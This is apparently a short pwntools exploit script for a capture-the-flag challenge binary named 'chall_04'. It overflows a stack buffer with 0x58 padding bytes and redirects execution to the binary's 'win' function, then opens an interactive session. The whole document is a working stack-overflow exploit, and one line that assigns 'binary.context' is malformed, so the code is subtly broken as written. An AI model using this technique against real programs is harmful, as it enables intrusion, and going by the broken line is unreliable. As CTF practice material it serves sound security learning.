from pwn import *
p = process('./chall_04')
binary = binary.context = ELF('./chall_04')
payload = b"A"*(0x58) + p64(binary.sym.win)
p.recvline()
p.sendline(payload)
p.interactive()
